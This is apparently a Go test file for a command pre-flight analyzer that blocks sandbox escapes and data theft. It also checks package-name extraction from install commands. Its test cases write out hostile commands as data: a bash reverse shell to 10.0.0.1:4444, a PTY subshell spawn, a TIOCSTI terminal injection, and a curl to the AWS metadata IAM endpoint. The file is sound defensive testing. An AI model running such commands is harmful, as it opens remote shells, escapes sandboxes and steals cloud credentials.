package argus_test

import (
	"context"
	"testing"

	"github.com/bonjoski/ironbox/pkg/argus"
)

func TestPreFlightAnalyzer_CleanCommand(t *testing.T) {
	ctx := context.Background()
	analyzer := argus.NewPreFlightAnalyzer(argus.LevelStrict)

	cmd := "go test ./... && echo 'Build succeeded'"
	report, err := analyzer.Analyze(ctx, cmd)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if !report.Allowed {
		t.Errorf("expected clean command to be allowed, but was blocked: %+v", report.Findings)
	}
}

func TestPreFlightAnalyzer_EscapeTraps(t *testing.T) {
	ctx := context.Background()
	analyzer := argus.NewPreFlightAnalyzer(argus.LevelStrict)

	tests := []struct {
		name       string
		cmd        string
		expectedID string
	}{
		{
			name:       "PTY Spawn Subshell",
			cmd:        `python3 -c "import pty; pty.spawn('/bin/bash')"`,
			expectedID: "SEC-ESCAPE-PTY",
		},
		{
			name:       "Reverse Shell",
			cmd:        `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`,
			expectedID: "SEC-ESCAPE-REVERSE-SHELL",
		},
		{
			name:       "TIOCSTI TTY injection",
			cmd:        `python3 -c "import fcntl, termios; fcntl.ioctl(0, termios.TIOCSTI, b'x')"`,
			expectedID: "SEC-ESCAPE-TIOCSTI",
		},
		{
			name:       "AWS Metadata Service Egress",
			cmd:        `curl -s http://169.254.169.254/latest/meta-data/iam/`,
			expectedID: "SEC-EXFIL-METADATA",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			report, err := analyzer.Analyze(ctx, tt.cmd)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if report.Allowed {
				t.Errorf("expected command %q to be blocked, but was allowed", tt.cmd)
			}

			found := false
			for _, f := range report.Findings {
				if f.RuleID == tt.expectedID {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("expected finding %s, got: %+v", tt.expectedID, report.Findings)
			}
		})
	}
}

func TestPreFlightAnalyzer_PackageExtraction(t *testing.T) {
	ctx := context.Background()
	analyzer := argus.NewPreFlightAnalyzer(argus.LevelStrict)

	cmd := "pip install torch-hallucinated-xyz && npm i lodash-fake"
	report, err := analyzer.Analyze(ctx, cmd)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if len(report.ExtractedPkgs) != 2 {
		t.Fatalf("expected 2 extracted packages, got %d", len(report.ExtractedPkgs))
	}

	if report.ExtractedPkgs[0].Name != "torch-hallucinated-xyz" || report.ExtractedPkgs[0].Ecosystem != "pypi" {
		t.Errorf("unexpected package 0: %+v", report.ExtractedPkgs[0])
	}
	if report.ExtractedPkgs[1].Name != "lodash-fake" || report.ExtractedPkgs[1].Ecosystem != "npm" {
		t.Errorf("unexpected package 1: %+v", report.ExtractedPkgs[1])
	}
}
